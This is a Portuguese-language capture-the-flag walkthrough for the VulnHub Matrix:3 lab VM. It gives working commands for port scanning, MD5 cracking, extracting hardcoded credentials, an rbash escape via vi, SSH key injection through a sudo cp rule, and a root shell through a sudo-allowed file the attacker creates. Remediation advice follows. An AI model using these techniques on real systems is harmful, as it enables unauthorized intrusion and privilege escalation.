# VulnHub Matrix:3 — Não Existe Colher (Mas Existem Três Armadilhas)

"Siga o coelho branco." Se você conhece Matrix, sabe: o coelho sempre leva a algum lugar real. Matrix:3 de Ajay Verma é a terceira e mais complexa entrada da série, e entrega o que promete. Múltiplas portas, um arquivo gzip com nome errado escondendo credenciais, um binário DOS que você precisa reverter no Ghidra, uma jaula rbash, e uma cadeia de escalação de privilégios em dois passos via sudo. Caramba, essa VM é top demais do começo ao fim, mano.

Muito obrigado ao **Ajay Verma** por uma máquina que te força a pensar de forma lateral: a dica diz "Siga suas intuições e enumere!" e ela quer dizer isso de verdade.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Intermediário |
| **VM Alvo** | Matrix:3 |
| **VM Atacante** | Kali Linux 2019.2 |
| **VulnHub** | https://www.vulnhub.com/entry/matrix-3,339/ |
| **Técnicas** | Host discovery, scan Nmap multi-porta, enumeração web (dirb, HTTrack), arquivo com tipo identificado erroneamente (secret.gz), quebra de hash (John/hashcat), HTTP Basic Auth, download de binário em endpoint autenticado, engenharia reversa (Ghidra), SSH em porta não padrão, escape de rbash via vi, correção de PATH, abuso de sudo cp (injeção de chave SSH), movimento lateral para trinity, sudo oracle (binário inexistente), escalação de privilégios para root |
| **CVEs** | Sem CVEs específicas. Técnicas mapeiam para MITRE ATT&CK: credenciais hardcoded (T1552.001), misconfiguration de sudo (T1548.003), escape de rbash (T1059.004). |

> **Dica do autor:**
> "Siga suas intuições ... e enumere!"

---

## Resumo do Ataque

```
[arp-scan: alvo em 192.168.10.101]
    |
    v
[nmap: 80/http (Python SimpleHTTP), 6464/ssh, 7331/http (Basic Auth, Python BaseHTTP)]
    |
    v
[porta 80: página "Siga o coelho branco" + dica no nome da imagem do coelho]
    |
    v
[dirb: diretório /Matrix descoberto]
    |
    v
[HTTrack mirror /Matrix: encontra secret.gz (nome errado - na verdade texto ASCII)]
    |
    v
[cat secret.gz: hash MD5 do admin -> john/hashcat: admin:passwd]
    |
    v
[porta 7331: HTTP Basic Auth com admin:passwd -> autenticado]
    |
    v
[dirb autenticado: diretório /data -> download de binário]
    |
    v
[Ghidra engenharia reversa do binário PE32 DOS: guest:7R1n17yN30]
    |
    v
[SSH guest@192.168.10.101 -p 6464 -> shell rbash restrito]
    |
    v
[escape rbash via vi (:!/bin/bash) -> corrigir PATH]
    |
    v
[sudo -l: (trinity) NOPASSWD: /bin/cp]
    |
    v
[ssh-keygen -> copiar id_rsa.pub para /home/trinity/.ssh/authorized_keys via sudo cp]
    |
    v
[ssh trinity@127.0.0.1 -p 6464 -i id_rsa]
    |
    v
[sudo -l: (root) NOPASSWD: /home/trinity/oracle (arquivo não existe)]
    |
    v
[echo "/bin/sh" > ~/oracle; chmod 777 ~/oracle; sudo ~/oracle]
    |
    v
[ROOT -> cat /root/flag.txt]
```

---

## Metodologia

1. Host discovery (arp-scan) e enumeração Nmap multi-porta
2. Enumeração web porta 80: dica do coelho, diretório escondido, mirror com HTTrack
3. Arquivo com identificação errada (secret.gz como texto ASCII): extrai hash MD5
4. Quebra de hash: MD5 para senha em texto claro
5. Acesso autenticado à porta 7331: descobrir e baixar binário
6. Engenharia reversa Ghidra do binário DOS PE32: extrair credenciais hardcoded
7. Login SSH na porta 6464: escape de rbash via vi
8. Correção de PATH e enumeração sudo
9. Abuso de sudo cp: injetar chave SSH pública como authorized_keys de trinity
10. Movimento lateral para trinity via autenticação por chave SSH
11. sudo oracle: criar binário inexistente, obter root

---

## Passo 1 — Identificando o Alvo

```bash
arp-scan --localnet --ignoredups
```

O alvo aparece em `192.168.10.101`. Obs: seu IP pode ser diferente se estiver em uma sub-rede diferente.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning]

---

## Passo 2 — Reconhecimento: Nmap Revela Três Serviços

```bash
nmap -A -T4 -p- 192.168.10.101
```

Saída esperada:

```
80/tcp   open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
6464/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
7331/tcp open  caldav  Python BaseHTTPServer (http-auth: Basic)
```

Três serviços. SSH está em porta não padrão (6464 em vez de 22). HTTP nas portas 80 e 7331, sendo a 7331 com autenticação Basic. O Nmap já informa que 7331 usa HTTP Basic Auth. Reconhecimento top demais.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1046 Network Service Discovery]

---

## Passo 3 — Enumeração Porta 80: Siga o Coelho Branco

Acesse `http://192.168.10.101`. A página diz "Siga o coelho branco" com uma pequena imagem de coelho no final. Veja o código-fonte (Ctrl+U):

```html
<img src="/assets/img/Matrix_can-show-you-the-door.png" title="Matrix can show you the door">
```

O nome da imagem é a dica: "Matrix pode te mostrar a porta." Devemos procurar um diretório chamado `/Matrix`.

Tente `/robots.txt`: retorna 404. Execute o dirb:

```bash
dirb http://192.168.10.101 /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Descoberta esperada:

```
+ http://192.168.10.101/Matrix
+ http://192.168.10.101/assets
```

O diretório `/Matrix` tem muitos subdiretórios aninhados. Para evitar adivinhar caminhos manualmente, faça um mirror de tudo:

```bash
httrack http://192.168.10.101/Matrix -O "site"
# Baixa tudo em /Matrix para a pasta local "site"

# Alternativa: wget
wget --header='Accept-Encoding: *' -r --no-parent --reject "index.html*" \
     http://192.168.10.101/Matrix/ -o site 2>/dev/null
```

Agora busque por arquivos interessantes (ignore arquivos de índice do HTTrack):

```bash
find site/ -type f ! -name "index*" -exec ls -lh {} \;
```

Esperado: você encontrará `secret.gz`.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1083 File and Directory Discovery]

---

## Passo 4 — Arquivo com Nome Errado: secret.gz é na Verdade Texto

Tente extrair o `secret.gz`:

```bash
tar -vzxf secret.gz
# gzip: stdin: not in gzip format
# tar: Child returned status 1
```

Falha. Verifique o tipo real do arquivo:

```bash
file secret.gz
# secret.gz: ASCII text (apesar da extensão .gz)
```

Armadilha clássica de arquivo mal identificado. Basta ler:

```bash
cat secret.gz
```

Saída esperada:

```
admin:76a2173be6393254e72ffa4d6df1030a
```

Temos um username (`admin`) e o que parece ser um hash MD5. ᕕ( ᐛ )ᕗ

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1552.001 Unsecured Credentials: Credentials in Files]

---

## Passo 5 — Quebrando o Hash

O hash `76a2173be6393254e72ffa4d6df1030a` tem 32 caracteres hexadecimais: MD5.

```bash
# Opção 1: John the Ripper
echo "76a2173be6393254e72ffa4d6df1030a" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

```bash
# Opção 2: hashcat com GPU (recomendado pela velocidade)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -d 1 -w 3
hashcat -m 0 hash.txt --show
```

```bash
# Opção 3: quebra online (sem precisar de GPU)
# HashKiller.co.uk ou crackstation.net
```

Resultado: `76a2173be6393254e72ffa4d6df1030a:passwd`

**Credenciais: admin:passwd** ( ͡° ͜ʖ ͡°)

> **MITRE ATT&CK:** [T1110.002 Brute Force: Password Cracking]

---

## Passo 6 — Porta 7331: Serviço Web Autenticado

Teste o serviço 7331. Sem credenciais:

```bash
curl -s http://192.168.10.101:7331
# no auth header received
```

Com credenciais:

```bash
curl -v http://192.168.10.101:7331 -u admin:passwd
# ou com cabeçalho Base64 manual:
curl -H "Authorization: Basic $(echo -n 'admin:passwd' | base64)" http://192.168.10.101:7331
```

Acesso concedido! A página não mostra muito. Verifique `/robots.txt`:

```
User-agent: *
Disallow: /data/
```

Enumere mais com dirb (deve passar as credenciais):

```bash
dirb http://192.168.10.101:7331 -u admin:passwd
```

O diretório `/data` contém um arquivo. Baixe-o:

```bash
curl http://192.168.10.101:7331/data/data -u admin:passwd -o data
file data
# data: MS-DOS executable, PE32 Executable for MS Windows
```

Um binário Windows/DOS em um CTF Linux! Interessante. ¯\_(ツ)_/¯

Tente rodar com Wine:

```bash
wine $(pwd)/data
# Saída breve, não muito informativa
```

Hora de engenharia reversa.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1082 System Information Discovery] [T1518 Software Discovery]

---

## Passo 7 — Engenharia Reversa do Binário DOS com Ghidra

> **O que é engenharia reversa?**
> Engenharia reversa é o processo de analisar um binário compilado para entender seu comportamento, extrair valores hardcoded e descobrir funcionalidades ocultas sem acesso ao código-fonte. Ferramentas como Ghidra (NSA, open source), IDA Pro e Radare2 são amplamente utilizadas.
> Referência: https://www.ghidra-sre.org/

Abra o Ghidra, crie um novo projeto, importe o binário `data` e execute a análise automática.

Passos principais:
1. Vá em Window > Defined Strings (ou busque strings na Assembly view)
2. Procure por strings ASCII que pareçam credenciais

Na função main ou em referências de strings próximas, você encontrará:

```
guest
7R1n17yN30
```

**Credenciais: guest:7R1n17yN30** ᕕ( ᐛ )ᕗ

Você também pode tentar com strings pelo terminal se o Ghidra não estiver disponível:

```bash
strings data | grep -E '[a-zA-Z0-9]{6,}'
# Procure por padrões de usuário/senha
```

> **Nota do mundo real:** Credenciais hardcoded em binários compilados são um achado crítico de segurança. Múltiplos grupos APT incluindo o APT28 (Fancy Bear) utilizaram binários com credenciais de C2 embutidas que foram extraídas durante análise forense, permitindo que defensores identificassem a infraestrutura. Referência: https://attack.mitre.org/groups/G0007/

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1552.001 Unsecured Credentials: Credentials in Files]

---

## Passo 8 — Login SSH em Porta Não Padrão (escape de rbash)

SSH está na porta 6464. Conecte com as credenciais extraídas:

```bash
ssh guest@192.168.10.101 -p 6464
# Senha: 7R1n17yN30
```

Caímos em um shell bash restrito (rbash). A maioria dos comandos falha.

Verifique o que está disponível:

```bash
echo $PATH
# /home/guest/bin  (ou caminho minimal similar)

ls ~/bin
# vi  (encontrei!)
```

> **O que é rbash (restricted bash)?**
> rbash é uma versão do bash com restrições: sem `cd`, sem escrever em variáveis, sem executar comandos com `/`, e sem alterar `$PATH`. É projetado como medida de segurança leve. Porém, é contornável via editores ou outros binários que permitem execução de shell.
> Referência: https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf

Escape o rbash usando vi:

```bash
vi
```

Dentro do vi, digite:

```
:set shell=/bin/bash
:shell
```

Ou mais simples ainda:

```
:!/bin/bash
```

Agora você tem um shell bash completo. Mas muitos comandos ainda falham porque `$PATH` está mínimo. Corrija:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Agora você pode executar ferramentas padrão.

> **MITRE ATT&CK:** [T1059.004 Command and Scripting Interpreter: Unix Shell]

---

## Passo 9 — Escalação Parte 1: sudo cp para Injetar Chave SSH

Verifique permissões sudo:

```bash
sudo -l
```

Saída esperada:

```
(trinity) NOPASSWD: /bin/cp
```

O usuário `guest` pode executar `/bin/cp` como `trinity` sem senha. `cp` como outro usuário significa que podemos escrever em qualquer arquivo que `trinity` possua. O caminho `~/.ssh/authorized_keys` é perfeito.

Gere um par de chaves SSH (no alvo, em um diretório com permissão de escrita):

```bash
ssh-keygen -t rsa
# Pressione Enter em todos os campos (sem passphrase, caminho padrão /home/guest/.ssh/id_rsa)
```

Defina permissões abertas na chave pública:

```bash
chmod 777 ~/.ssh/id_rsa.pub
```

Copie a chave pública para um local temporário, depois use sudo cp para colocá-la como authorized_keys de trinity:

```bash
cp ~/.ssh/id_rsa.pub /tmp/id_rsa.pub
sudo -u trinity /bin/cp /tmp/id_rsa.pub /home/trinity/.ssh/authorized_keys
```

> **Nota do mundo real:** Regras sudo concedendo `cp` para outro usuário são um vetor de escalação de privilégios bem conhecido. Um atacante pode sobrescrever qualquer arquivo que o usuário alvo possua, incluindo cron jobs, chaves SSH ou arquivos de perfil de shell. É por isso que o CIS Benchmark e o NIST SP 800-53 AC-6 alertam explicitamente contra concessões de operações de arquivo via sudo sem restrição.

> **MITRE ATT&CK:** [T1548.003 Abuse Elevation Control Mechanism: Sudo] [T1098.004 Account Manipulation: SSH Authorized Keys]

---

## Passo 10 — Movimento Lateral para Trinity via Chave SSH

Agora faça SSH para trinity usando a chave injetada:

```bash
ssh trinity@127.0.0.1 -p 6464
# Usa a chave privada id_rsa (sem senha pois injetamos a chave pública)
```

Se você gerou o par de chaves com caminho padrão, a chave será usada automaticamente. Caso contrário, especifique:

```bash
ssh trinity@127.0.0.1 -p 6464 -i ~/.ssh/id_rsa
```

Agora somos trinity. Verifique sudo:

```bash
sudo -l
```

Esperado:

```
(root) NOPASSWD: /home/trinity/oracle
```

trinity pode executar `/home/trinity/oracle` como root. Mas o arquivo não existe! Esse é o truque. ( ͡° ͜ʖ ͡°)

> **MITRE ATT&CK:** [TA0008 Lateral Movement] [T1550.004 Use Alternate Authentication Material: SSH Keys]

---

## Passo 11 — Root via Binário oracle Customizado

A regra sudo referencia um caminho que controlamos (nosso próprio diretório home). Crie o binário oracle como um lançador de shell:

```bash
echo "/bin/sh -i" > ~/oracle
chmod 777 ~/oracle
sudo ~/oracle
```

Esperado:

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/flag.txt
```

**(☞ﾟヮﾟ)☞ ROOT! Estamos dentro da Matrix... ou melhor, acabamos de owná-la.**

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo]

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Onde Encontrado | Crackeado/Usado |
|------|-------|-----------------|----------------|
| Hash MD5 | `76a2173be6393254e72ffa4d6df1030a` | `secret.gz` (mal identificado) | `passwd` (John/hashcat) |
| Credencial | `admin:passwd` | Quebra de hash | HTTP Basic Auth porta 7331 |
| Credencial | `guest:7R1n17yN30` | Ghidra RE do binário DOS | SSH porta 6464 |
| Flag root | Ver `/root/flag.txt` | `/root/flag.txt` | Objetivo final |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|----------------|
| 1 | Credenciais hardcoded no binário DOS | Campanhas APT routineiramente embutem credenciais em binários de ferramentas: extração via RE é técnica forense padrão | Nunca hardcodar credenciais em código compilado: use secrets managers ou variáveis de ambiente |
| 2 | sudo cp com escrita no home de outro usuário | Concede escrita de arquivo como outro usuário: pode sobrescrever chaves SSH, cron jobs, perfis de shell | Restringir regras sudo a comandos não relacionados a operações de arquivo; usar whitelisting explícito de caminhos |
| 3 | sudo referenciando caminho inexistente | Se uma regra sudo aponta para um arquivo que o usuário sudo pode criar, ele pode escrever conteúdo arbitrário lá | Garantir que binários referenciados em sudo existam, sejam de propriedade do root e não sejam world-writable |
| 4 | Escape de rbash via vi | Shells restritos que dependem apenas de restrições do shell sem sandboxing em nível de processo são contornáveis via editores com capacidade de execução de shell | Combinar rbash com perfis seccomp, ForceCommand no sshd_config ou restrições PAM |
| 5 | SSH em porta não padrão (6464) | Segurança por obscuridade: portas não padrão reduzem levemente o ruído de scans automatizados mas não fornecem segurança real | Scan de porta completo (-p-) derrota a obscuridade de portas; use regras de firewall adequadas |

**Por que isso importa fora do lab?**

Credenciais hardcoded em binários compilados são um achado crítico recorrente em assessments corporativos reais. O malware SUNBURST do SolarWinds (2020) embutia dados de configuração e autenticação em DLLs compiladas que pesquisadores de segurança extraíram via engenharia reversa para compreender a infraestrutura de C2. Misconfiguration de sudo é um dos achados de escalação de privilégios mais comuns em assessments de ambientes Linux: o projeto GTFOBins documenta mais de 300 binários que podem ser abusados via sudo. O escape de rbash via vi é literalmente o item 1 do guia GTFO de bypass de shell restrito.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Descoberta | TA0007 | Network Service Discovery | T1046 |
| Descoberta | TA0007 | File and Directory Discovery | T1083 |
| Acesso a Credenciais | TA0006 | Unsecured Credentials in Files | T1552.001 |
| Acesso a Credenciais | TA0006 | Brute Force: Password Cracking | T1110.002 |
| Acesso Inicial | TA0001 | Valid Accounts | T1078 |
| Execução | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Movimento Lateral | TA0008 | Use Alternate Authentication Material: SSH Keys | T1550.004 |
| Escalação de Privilégios | TA0004 | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Escalação de Privilégios | TA0004 | Account Manipulation: SSH Authorized Keys | T1098.004 |
| Coleta | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Nunca hardcodar credenciais em binários compilados: use secrets manager (HashiCorp Vault, AWS Secrets Manager) ou variáveis de ambiente.
2. Remover a regra sudo `(trinity) NOPASSWD: /bin/cp` ou restringi-la a caminhos específicos de origem/destino.
3. Garantir que binários referenciados em sudo existam, sejam de propriedade do root, não sejam world-writable e sejam imutáveis (`chattr +i`).
4. Substituir rbash por SSH `ForceCommand` adequado e restrições PAM para prevenir escapes via vi.
5. Se portas SSH não padrão forem usadas para obscuridade, ainda assim exigir apenas autenticação por chave SSH e desabilitar auth por senha.

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Rotacionar credenciais de qualquer conta com direitos sudo.
- Revisar todas as regras sudo: `sudo -l -U <user>` para cada conta interativa.
- Verificar `~/.ssh/authorized_keys` em todas as contas por entradas inesperadas.
- Auditar binários SUID e acessíveis via sudo.

**Contramedidas MITRE D3FEND:**
- D3-MFA (Multi-factor Authentication) para T1078 Valid Accounts
- D3-CTS (Credential Transmission Scoping) para T1552.001 credenciais hardcoded
- D3-OPS (OS Process Sandboxing) para T1548.003 abuso de sudo
- D3-SJA (Scheduled Job Analysis) para detectar novas entradas em authorized_keys

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identificar (ID.AM): Inventariar todas as regras sudo e authorized_keys SSH em todas as contas de usuário.
- Proteger (PR.AC-4): Aplicar menor privilégio nas regras sudo; exigir restrições PAM em shells restritos.
- Detectar (DE.CM-1): Monitorar novas entradas em `~/.ssh/authorized_keys` e mudanças em regras sudo.
- Responder (RS.AN): Revisar artefatos de movimento lateral; identificar quais contas foram comprometidas.
- Recuperar (RC.RP): Rotacionar todas as credenciais afetadas; auditar regras sudo e reconstruir ambientes de shell restritivos.

**NIST SP 800-53 (Rev. 5):**
- AC-6: Menor Privilégio (restringir sudo ao mínimo necessário)
- IA-5: Gerenciamento de Autenticação (remover credenciais hardcoded do código)
- CM-7: Funcionalidade Mínima (garantir ausência de regras sudo ou binários SUID desnecessários)
- SI-10: Validação de Entrada (validar existência e permissões de binários referenciados em sudo)
- CA-7: Monitoramento Contínuo (alertar sobre mudanças em regras sudo e modificações em authorized_keys)

**CISA Known Exploited Vulnerabilities:**
- Sem CVEs específicas desta VM no catálogo CISA KEV. As técnicas (abuso de sudo, escape de rbash) são genéricas e mapeiam para múltiplas CVEs em produtos de shell restrito.
- Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: ACCESS
- Prática: Identity and Access Management (gerenciamento de privilégios e revisão de contas)
- MIL Alvo: MIL-2 (atribuição de privilégios documentada e gerenciada; revisões regulares de acesso)

---

## Considerações Finais

Muito obrigado ao **Ajay Verma** por uma máquina que genuinamente recompensa enumeração paciente. O tema Matrix não é apenas decoração: cada passo exige que você questione o que vê e siga as pistas que a VM deixa para trás. O `secret.gz` mal identificado, o binário PE32 em um servidor Linux, o binário oracle inexistente. Tudo isso é a VM dizendo "não existe colher: faça a sua."

Essa máquina é excelente preparação para o OSCP: extração de credenciais hardcoded, escape de rbash, escalação de privilégios encadeada via sudo e movimento lateral por injeção de chave SSH são todos temas válidos em assessments reais.

Se este walkthrough te ajudou, compartilha com a galera e continua hackando! capaz gg

*Thanks guys!! (❍ᴥ❍ʋ)*

> Artigo original em português de André Henrique: https://medium.com/uniaogeek/vulnhub-matrix-v3-walkthrough

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
